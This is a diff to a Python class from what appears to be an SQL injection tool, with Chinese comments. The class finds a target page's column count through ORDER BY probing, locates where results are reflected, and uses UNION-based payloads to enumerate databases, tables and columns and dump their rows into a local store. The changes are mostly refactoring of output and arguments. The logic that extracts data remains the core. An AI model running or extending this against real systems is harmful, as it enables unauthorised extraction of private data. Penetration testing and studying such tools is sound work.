@@ -2,6 +2,7 @@ import sys
 from lib.core.function.get_info import *
 from lib.core.function.payload import *
 from lib.database.data_storage import *
+from lib.output.output import *
 import random
 
 class Injection():
@@ -17,35 +18,15 @@ class Injection():
     _magic_str = '' # 魔力字符串
     _url_ready = '' # 预处理url
 
-    def __init__(self, url, pre_payload=''):
+    def __init__(self, url, arguments ,pre_payload=''):
         self._magic_str = "$$$$$$$$$$$$$$$$$"
         _url = url.split('//')[1].split('/')[0].split(':')[0]
         self.database = Data(F"{_url}.sqlite")
         self.url = url
         self.page_info = PageInfo(url)
         self.payload = Payload(pre_payload)
-
-    def _get_columns_num(self):
-        '''
-        得到当前列的所有列数
-        '''
-        low = 0
-        high = 64
-        probe_num = 0
-        serial_num = 0
-        while low < high-1:
-            probe_num = (low+high)//2
-            payload = self.payload.order_by(probe_num)
-            url_malformation = self._url_ready.replace(self._magic_str, payload)
-            serial_num = self.page_info.init_malinfo_location(url_malformation, ['Unknown column '])
-            if serial_num > -1:
-                # 表示不列存在
-                high = probe_num
-            else: # 表示列存在
-                low = probe_num
-        if serial_num > -1:
-            probe_num -= 1
-        self._probe_num = probe_num
+        self.output = Output()
+        self.arguments = arguments
 
 
     def exec_payload(self, location, level, database='', table='', columns=[]):
@@ -86,6 +67,28 @@ class Injection():
             self._get_data(database, table, columns)
         self.database.close()
 
+    def _get_columns_num(self):
+        '''
+        得到当前列的所有列数
+        '''
+        low = 0
+        high = 64
+        probe_num = 0
+        serial_num = 0
+        while low < high-1:
+            probe_num = (low+high)//2
+            payload = self.payload.order_by(probe_num)
+            url_malformation = self._url_ready.replace(self._magic_str, payload)
+            serial_num = self.page_info.init_malinfo_location(url_malformation, ['Unknown column '])
+            if serial_num > -1:
+                # 表示不列存在
+                high = probe_num
+            else: # 表示列存在
+                low = probe_num
+        if serial_num > -1:
+            probe_num -= 1
+        self._probe_num = probe_num
+
 
     def _get_databases(self):
         databases = self._analysis_data()
@@ -122,9 +125,9 @@ class Injection():
             for db in self.database.get_databases():
                 for tb in self.database.get_tables(db):
                     columns = self._analysis_data(db, tb)
-                    print("database: "  + db)
-                    print("\ttable: " + tb)
-                    print("\t\t columns: " + str(columns))
+                    # print("database: "  + db)
+                    # print("\ttable: " + tb)
+                    # print("\t\t columns: " + str(columns))
                     self.database.add_column(db, tb, columns)
 
     def _get_data(self, database='', table='', columns=[]):
@@ -149,10 +152,10 @@ class Injection():
                     columns = self.database.get_columns(db, tb)
                     data = self._analysis_data(db, tb, columns)
                     for data_line in data:
-                        print("database: " + db)
-                        print("\ttable:" + tb)
-                        print("\t\tcolumns: " + str(columns))
-                        print("\t\t\tdata: " + data_line)
+                        # print("database: " + db)
+                        # print("\ttable:" + tb)
+                        # print("\t\tcolumns: " + str(columns))
+                        # print("\t\t\tdata: " + data_line)
                         self.database.add_data(db, tb, columns, data_line.split('`'))
 
     def _analysis_data(self, database='', table='', columns=[], split_char=','):
@@ -165,10 +168,11 @@ class Injection():
         '''
         payload = self.payload.union_sql(self._probe_num, self._serial_num, database, table, columns)
         url_malformation = self._url_ready.replace(self._magic_str, str(payload))
-        print("\033[0;41m%s\033[0m" % (url_malformation))
+        if self.arguments.options.show_level:
+            self.output.info(url_malformation)
         result = self.page_info.get_info(url_malformation)
         if result == '':
-            sys.stderr.write("result 结果异常" + "\n\turl attack: " + url_malformation)
+            self.output.error(F"result 结果异常,url: {url_malformation}")
         print(result)
         return result.split(split_char)
 
@@ -184,7 +188,7 @@ class Injection():
         url_malformation = self._url_ready.replace(self._magic_str, payload)
         serial_num = self.page_info.init_malinfo_location(url_malformation, randnum_list)
         if serial_num < 0:
-            print("未能探测成功")
+            self.output.warning("未能探测成功")
         self._serial_num = serial_num + 1
 
 
